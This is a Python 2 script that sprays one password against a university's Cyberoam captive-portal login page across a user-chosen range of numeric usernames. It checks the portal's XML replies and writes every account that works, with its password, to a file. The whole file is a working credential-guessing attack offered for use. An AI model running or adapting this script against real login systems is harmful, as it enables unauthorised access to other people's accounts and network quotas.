import requests

file = open("username.txt","w")
num2 = input('Enter starting range to search: ')
initial = int(num2)
num3 = input('Enter ending range to search : ')
terminal= int(num3)
for x in range(initial,terminal):
	file.write(str(initial))
	file.write("\n")
        initial += 1
	
file.close()
# Cyberoam url for our university.
url = 'http://172.16.73.12:8090/httpclient.html'
username=[]

with open("username.txt") as f:
    username = f.readlines() # reads all the line until EOF. 

password=''
password = raw_input("Enter Password: ")
print("Searching ...")
add=open("working.txt","a") 
 
# XML Responses for different cases
success = "<?xml version='1.0' ?><requestresponse><status><![CDATA[LIVE]]></status><message><![CDATA[You have successfully logged in]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse> \n" 

dataexceed="<?xml version='1.0' ?><requestresponse><status><![CDATA[LOGIN]]></status><message><![CDATA[Your data transfer has been exceeded, Please contact the administrator]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse> \n"

maxlogin="<?xml version='1.0' ?><requestresponse><status><![CDATA[LOGIN]]></status><message><![CDATA[You have reached Maximum Login Limit.]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse>\n"

count = 0     # initiating count 

"""

-------------------------------------This is the main for loop, 


"""


for i in username :
	i = i.replace("\n","")      # replaces '\n' with ' '
	values = {
	'mode':'191',
	'username':i,
	'password':password	
		  }
	r = requests.post(url, data=values)
	k = r.content    # for viewing the payload information.
	if(k == success):
		
		print i,":Can Be Login"
		add.write(i)
		add.write("\n")
		add.write(password)
		add.write("\n")
		count+=1
	if(k == dataexceed):
			
		print i,":Data Transfer Exceeded"
		add.write(i)
		add.write("\n")
		add.write(password)
		add.write("\n")		
		count+=1
		
	if(k == maxlogin):
		
		print i,":Max Login Limit Reached"
		add.write(i)
		add.write("\n")
		add.write(password)
		add.write("\n")
		count+=1	

if(count == 0 ):
    print "No Match Found"
else:
    print "%d Match Found" % count   
